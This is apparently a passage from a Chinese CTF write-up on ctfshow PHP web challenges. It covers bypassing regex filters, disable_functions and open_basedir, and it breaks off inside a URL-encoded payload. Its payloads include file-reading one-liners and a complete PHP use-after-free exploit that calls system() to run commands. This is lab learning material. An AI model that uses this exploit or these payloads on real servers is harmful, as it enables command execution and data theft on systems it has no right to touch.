link: https://ctfer.com*/// 还能炫的动吗？//flag in 36.phpif(isset($_GET[&#39;c&#39;]))&#123;    $c=$_GET[&#39;c&#39;];    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;        system(&quot;cat &quot;.$c.&quot;.php&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>要构造36这个数字</p><p>shell作用</p><ul><li>${_}:代表上一次命令执行的结果</li><li>$(()):做运算</li></ul><p>之前没有命令返回或者执行,结果应该是空,与<code>&quot;&quot;</code>等价又 <code>$((&quot;&quot;))</code>值为0,<code>$((~$((&quot;&quot;))))</code>值为-1,再做拼接:所以可以拼接得到-37 , -37取反得到36</p><p>payload</p><pre><code>?c=$((~$(($((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))))))</code></pre><h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><h2 id="绕过disable-fuctions"><a href="#绕过disable-fuctions" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: Lazzaro  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-07 22:02:47  email: h1xa@ctfer.com  link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;        $c= $_POST[&#39;c&#39;];        eval($c);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>获取文件路径</p><pre><code>c=print_r(scandir(dirname(&#39;__FILE__&#39;)));c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot;&quot;);&#125;c=$a=opendir(&quot;./&quot;);while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;;&#125;;</code></pre><p>读取文件</p><p>通过单一函数读取文件</p><pre><code>c=echo file_get_contents(&quot;flag.php&quot;);c=readfile(&quot;flag.php&quot;);c=var_dump(file(&quot;flag.php&quot;));c=print_r(file(&#39;flag.php&#39;)); #file 把整个文件读到一个数组里</code></pre><p>通过fopen读取文件</p><pre><code>fread()fgets()fgetc()fgetss()fgetcsv()gpassthru()c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line =fgets($a);echo $line;&#125;#一行一行读c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;#一个一个字符读取c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;</code></pre><p>通过高亮显示php文件</p><pre><code>c=show_source(&quot;flag.php&quot;);c=highlight_file(&quot;flag.php&quot;);</code></pre><h1 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h1><h2 id="绕过disable-fuctions-1"><a href="#绕过disable-fuctions-1" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: Lazzaro  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-07 22:02:47  email: h1xa@ctfer.com  link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;        $c= $_POST[&#39;c&#39;];        eval($c);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>查找flag文件的位置</p><pre><code>c=print_r(scandir(&#39;./&#39;));</code></pre><p>payload</p><pre><code>//paylaod汇总c=highlight_file(&quot;flag.php&quot;);c=var_dump(file(&quot;flag.php&quot;)); c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a);</code></pre><h1 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h1><h2 id="绕过disable-fuctions-2"><a href="#绕过disable-fuctions-2" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*-  Author: Lazzaro  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-07 22:02:47  email: h1xa@ctfer.com  link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;        $c= $_POST[&#39;c&#39;];        eval($c);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>查找</p><pre><code>c=print_r(scandir(&#39;./&#39;));</code></pre><p>payload</p><pre><code>c=highlight_file(&quot;flag.php&quot;);c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;不行的$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125; //php7.3版本后 该函数已不再被使用</code></pre><p>复制改名</p><pre><code>复制后访问url/flag.txtcopy()rename()c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);c=rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></pre><h1 id="web61-65"><a href="#web61-65" class="headerlink" title="web61-65"></a>web61-65</h1><h2 id="绕过disable-fuctions-3"><a href="#绕过disable-fuctions-3" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><p>为了熟悉学习新姿势c&#x3D;$a&#x3D;opendir(‘.&#x2F;‘);while(($file &#x3D; readdir($a)) !&#x3D;false){echo $file.” “;}或者c&#x3D;print_r(scandir(current(localeconv())));</p><pre><code>//payload:c=show_source(&#39;flag.php&#39;);c=highlight_file(&#39;flag.php&#39;);c=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></pre><h1 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h1><h2 id="绕过disable-fuctions-4"><a href="#绕过disable-fuctions-4" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><p>扫描目录c&#x3D;var_dump(scandir(“&#x2F;“));发现是flag.txt</p><pre><code>//下面是payloadc=include(&#39;/flag.txt&#39;);c=require(&#39;/flag.txt&#39;);c=require_once(&#39;/flag.txt&#39;);c=highlight_file(&#39;/flag.txt&#39;);</code></pre><h1 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h1><h2 id="绕过disable-fuctions-5"><a href="#绕过disable-fuctions-5" class="headerlink" title="绕过disable_fuctions"></a>绕过disable_fuctions</h2><p>快乐第一步扫描目录c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}</p><pre><code>//payload介绍c=include(&#39;/flag.txt&#39;);c=require(&#39;/flag.txt&#39;);c=require_once(&#39;/flag.txt&#39;);</code></pre><h1 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h1><h2 id="exit-使程序提前退出"><a href="#exit-使程序提前退出" class="headerlink" title="exit();使程序提前退出"></a>exit();使程序提前退出</h2><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*-  Author: Lazzaro  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-07 22:02:47  email: h1xa@ctfer.com  link: https://ctfer.com*/error_reporting(0);ini_set(&#39;display_errors&#39;, 0);// 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;        $c= $_POST[&#39;c&#39;];        eval($c);        $s = ob_get_contents();        ob_end_clean();        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;你要上天吗？</code></pre><ul><li>ob_get_contents 返回输出缓冲区的内容</li><li>ob_end_clean 清空缓冲区并关闭输出缓冲区</li></ul><pre><code>&lt;?php$a = &#39;system(&quot;ls&quot;);&#39;;eval($a);//在网页中会输出内容</code></pre><pre><code>&lt;?php$a = &#39;system(&quot;ls&quot;);&#39;;eval($a);ob_get_contents();ob_end_clean();&lt;?php$a = &#39;system(&quot;ls&quot;);&#39;;eval($a);$c = ob_get_contents();ob_end_clean();echo $c;//在这里则在网页当中没有输出内容，不难看出其取得了缓冲区的内容并清空了缓冲区</code></pre><p>payload</p><pre><code>c=require_once(&#39;/flag.txt&#39;);exit();</code></pre><p>exit();使程序提前退出,绕过后面正则表达式</p><h1 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h1><h2 id="使用glob-x2F-x2F-伪协议绕过open-basedir"><a href="#使用glob-x2F-x2F-伪协议绕过open-basedir" class="headerlink" title="使用glob:&#x2F;&#x2F;伪协议绕过open_basedir"></a>使用glob:&#x2F;&#x2F;伪协议绕过open_basedir</h2><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*-  Author: Lazzaro  Date:   2020-09-05 20:49:30  Last Modified by:   h1xa  Last Modified time: 2020-09-07 22:02:47  email: h1xa@ctfer.com  link: https://ctfer.com*/error_reporting(0);ini_set(&#39;display_errors&#39;, 0);// 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;        $c= $_POST[&#39;c&#39;];        eval($c);        $s = ob_get_contents();        ob_end_clean();        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;你要上天吗？</code></pre><p>payload解释</p><pre><code class="php">&lt;?php$a = &#39;?&gt;&lt;?php echo 111;?&gt;&#39;;eval($a);#111</code></pre><p>这里的?&gt;是为了闭合前面的&lt;?php</p><p>看位置</p><pre><code class="php">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob://./*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);?&gt;</code></pre><p>读文件没权限</p><h2 id="uaf绕过open-basedir执行命令"><a href="#uaf绕过open-basedir执行命令" class="headerlink" title="uaf绕过open_basedir执行命令"></a>uaf绕过open_basedir执行命令</h2><pre><code class="php">function ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;                 $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc = 10;     $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();</code></pre><p>url编下码</p><pre><code>c=%0A%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#39;args&#39;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#39;WIN&#39;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#39;This%20PoC%20is%20for%20*nix%20systems%20only.&#39;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%0A%20%20%20%20trigger_uaf(&#39;x&#39;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#39;args&#39;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr